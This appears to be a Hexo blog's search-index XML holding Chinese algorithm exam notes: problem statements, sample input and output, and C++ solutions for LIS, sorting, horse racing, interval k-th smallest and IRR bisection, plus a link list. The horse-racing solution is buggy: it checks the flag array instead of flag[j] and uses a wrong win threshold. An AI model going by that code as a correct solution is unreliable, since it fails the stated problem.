class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">int</span> inf = <span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="built_in">fill</span>(g, g + n, inf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[n - <span class="number">1</span> - i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//核心代码begin</span></span><br><span class="line">    <span class="comment">//挺难理解的，不过确实很厉害</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j = lower_bound(g, g + n, num[i]) - g; <span class="comment">//找到大于等于num[i]的第一个位置下标</span></span><br><span class="line">        g[j] = num[i];                             <span class="comment">//把num[i]放入g[j]的位置</span></span><br><span class="line">        d[i] = j + <span class="number">1</span>;                              <span class="comment">// 实际上放的就是每个元素为结尾的最大长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//end</span></span><br><span class="line">    <span class="keyword">int</span> s = *max_element(d, d + n); <span class="comment">//找到最大长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) <span class="comment">//为什么从后向前遍历？因为最长子序列上一个序列一定是再这个字母前面的嘛 比如 4 3 2 1 -&gt; 4是最后一个，3一定在4的前面</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == d[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (s != <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, num[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, num[i]);</span><br><span class="line">            --s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资料整理</title>
      <link href="/2020/11/02/ziliaoshouji/"/>
      <url>/2020/11/02/ziliaoshouji/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本栏目收集了平时看到的写的不错的博客。</p></blockquote><a id="more"></a><h2 id="数据结构相关"><a href="#数据结构相关" class="headerlink" title="数据结构相关"></a>数据结构相关</h2><h3 id="主席树"><a href="#主席树" class="headerlink" title="主席树"></a>主席树</h3><p><a href="https://www.cnblogs.com/zyf0163/p/4749042.html" target="_blank" rel="noopener">https://www.cnblogs.com/zyf0163/p/4749042.html</a></p><p><a href="https://www.cnblogs.com/Empress/p/4652449.html" target="_blank" rel="noopener">https://www.cnblogs.com/Empress/p/4652449.html</a></p><h2 id="网络安全相关"><a href="#网络安全相关" class="headerlink" title="网络安全相关"></a>网络安全相关</h2><h3 id="perl文件上传漏洞"><a href="#perl文件上传漏洞" class="headerlink" title="perl文件上传漏洞"></a>perl文件上传漏洞</h3><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107904281" target="_blank" rel="noopener">https://blog.csdn.net/hxhxhxhxx/article/details/107904281</a></p><h2 id="Java相关"><a href="#Java相关" class="headerlink" title="Java相关"></a>Java相关</h2><p>浅拷贝和深拷贝：解释了String和Number类型为什么浅拷贝也可以得到一个副本，因为这样的类是不可变的，所以浅拷贝也会copy。</p><p><a href="https://www.cnblogs.com/blogtech/p/11989306.html" target="_blank" rel="noopener">https://www.cnblogs.com/blogtech/p/11989306.html</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201222191020903.png" alt="image-20201222191020903"></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分查找</title>
      <link href="/2020/10/31/erfenchazhao1/"/>
      <url>/2020/10/31/erfenchazhao1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>二分查找算法考试复习(不仅仅是二分查找，还有一些水题)</p></blockquote><a id="more"></a><h2 id="单词排序"><a href="#单词排序" class="headerlink" title="单词排序"></a>单词排序</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入包含两行。</p><p>第一行仅包括一个正整数N(0&lt;N≤26)。</p><p>第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。</p><p>单个单词长度不超过1010。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">city boy tree student</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boy city student tree</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>水题，按照字典序排列后输出即可</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">string s[1015];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">for(int i&#x3D;0;i&lt;n;++i)&#123;</span><br><span class="line">cin&gt;&gt;s[i];</span><br><span class="line">&#125;</span><br><span class="line">sort(s,s+n);</span><br><span class="line">for(int i&#x3D;0;i&lt;n;++i)&#123;</span><br><span class="line">cout&lt;&lt;s[i]&lt;&lt;&#39; &#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="渊子赛马"><a href="#渊子赛马" class="headerlink" title="渊子赛马"></a>渊子赛马</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">2 3 3 4 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">4</span><br><span class="line">2 2 1 2</span><br><span class="line">2 2 3 1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>先排序，遍历对手的马，找到刚好能打败对手的马，然后把这匹马标记（不能用了）num++，循环，最后判断num是不是大于n/2+1。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">1015</span>];</span><br><span class="line"><span class="keyword">int</span> d[<span class="number">1015</span>];</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">1015</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&amp;&amp;n!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s[i];<span class="comment">//我的马 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;d[i];<span class="comment">//对手的马 </span></span><br><span class="line">&#125;</span><br><span class="line">sort(s,s+n);</span><br><span class="line">sort(d,d+n);</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line"><span class="comment">//遍历对手的马</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j]&gt;d[i]&amp;&amp;flag!=<span class="number">0</span>)&#123;</span><br><span class="line">num++;</span><br><span class="line">flag[j]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num&gt;n/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"YES"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"NO"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间第K小"><a href="#区间第K小" class="headerlink" title="区间第K小"></a>区间第K小</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。</p><p>例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述</p><p>第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9)</p><p>数据保证数列b中的元素个数不少于k个</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>输出一个数，表示数列b中的第k小的数</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">5 3 4 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9</span><br></pre></td></tr></table></figure><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//说实话，没看懂这个代码，可能是我太菜了吧</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">max_position</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> result = <span class="number">0</span>;             </span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">-1</span>, num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (r &lt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; k)                   </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[r + <span class="number">1</span>] &lt;= x)num++;</span><br><span class="line">            r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result += n - r;</span><br><span class="line">            <span class="keyword">if</span> (a[l] &lt;= x)num--;</span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">int</span>*b=<span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        b[i] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b, b + n);</span><br><span class="line">    <span class="keyword">int</span> len = unique(b, b + n) - b;    </span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = len - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ret = max_position(b[mid]);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= k)        </span><br><span class="line">        &#123;</span><br><span class="line">            ans = b[mid];</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="元素整除问题"><a href="#元素整除问题" class="headerlink" title="元素整除问题"></a>元素整除问题</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>输入20个整数</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>按输入顺序输出符合要求的数字，每行输出一个整数。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">18</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        b[i] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b, b + <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">20</span>;++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;b[j])&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]%b[j]==<span class="number">0</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内部收益率"><a href="#内部收益率" class="headerlink" title="内部收益率"></a>内部收益率</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/01a4c1588c7e83bb.png" alt="img"></p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/613e4b3974842675.png" alt="img"></p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">-1 2</span><br><span class="line">2</span><br><span class="line">-8 6 9</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.00</span><br><span class="line">0.50</span><br></pre></td></tr></table></figure><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, f, CF[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; f;</span><br><span class="line">        <span class="keyword">double</span> mid, high = <span class="number">10000</span>, low = <span class="number">-1</span>, r, k, sum;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; CF[i];</span><br><span class="line">        <span class="keyword">while</span> (high - low &gt; <span class="number">1.0e-6</span>)    </span><br><span class="line">        &#123;</span><br><span class="line">            mid = (high + low) / <span class="number">2</span>; </span><br><span class="line">            k = <span class="number">1</span>;</span><br><span class="line">            sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                k *= (<span class="number">1.0</span> / (<span class="number">1</span> + mid)); </span><br><span class="line">                sum += CF[j] * k;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum + f &gt; <span class="number">0</span>)</span><br><span class="line">                low = mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; mid &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span 